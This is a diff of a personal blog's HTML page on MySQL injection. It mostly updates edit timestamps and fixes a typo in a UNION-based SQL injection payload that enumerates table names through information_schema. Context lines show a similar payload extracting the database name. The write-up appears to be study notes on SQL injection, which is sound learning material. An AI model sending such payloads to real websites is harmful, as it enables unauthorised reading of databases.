@@ -116,7 +116,7 @@
 <meta property="og:site_name" content="fuubar2">
 <meta property="og:description" content="mysql介绍及操作增删语句 information_schema是一个很重要的库，information_schema.tables">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-03-26T15:19:28.395Z">
+<meta property="og:updated_time" content="2019-03-29T09:10:29.907Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mysql注入">
 <meta name="twitter:description" content="mysql介绍及操作增删语句 information_schema是一个很重要的库，information_schema.tables">
@@ -359,7 +359,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-03-26 23:19:28" itemprop="dateModified" datetime="2019-03-26T23:19:28+08:00">2019-03-26</time>
+                <time title="Modified: 2019-03-29 17:10:29" itemprop="dateModified" datetime="2019-03-29T17:10:29+08:00">2019-03-29</time>
               
             
           </span>
@@ -462,7 +462,7 @@
 <p><code>id=13 union select 1,database(),3,4,5,6,7,8,9,10</code></p>
 </li>
 <li><p>查询表</p>
-<p><code>id=13 union select 1,group_concat(table_name),3,4,5,6,7,8,9,10 from information_schema.tables where table_shema=xy # xy应转换为16进制</code></p>
+<p><code>id=13 union select 1,group_concat(table_name),3,4,5,6,7,8,9,10 from information_schema.tables where table_schema=xy # xy应转换为16进制</code></p>
 <p>直接’xy’不也行嘛？</p>
 </li>
 <li><p>查询列</p>
@@ -532,7 +532,7 @@
   <p><span>本文标题:</span><a href="/2019/03/24/mysql注入/">mysql注入</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 fuubar 的个人博客">fuubar</a></p>
   <p><span>发布时间:</span>2019年03月24日 - 17:03</p>
-  <p><span>最后更新:</span>2019年03月26日 - 23:03</p>
+  <p><span>最后更新:</span>2019年03月29日 - 17:03</p>
   <p><span>原始链接:</span><a href="/2019/03/24/mysql注入/" title="mysql注入">https://bookchi.github.io/2019/03/24/mysql注入/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://bookchi.github.io/2019/03/24/mysql注入/"  aria-label="复制成功！"></i></span>
   </p>
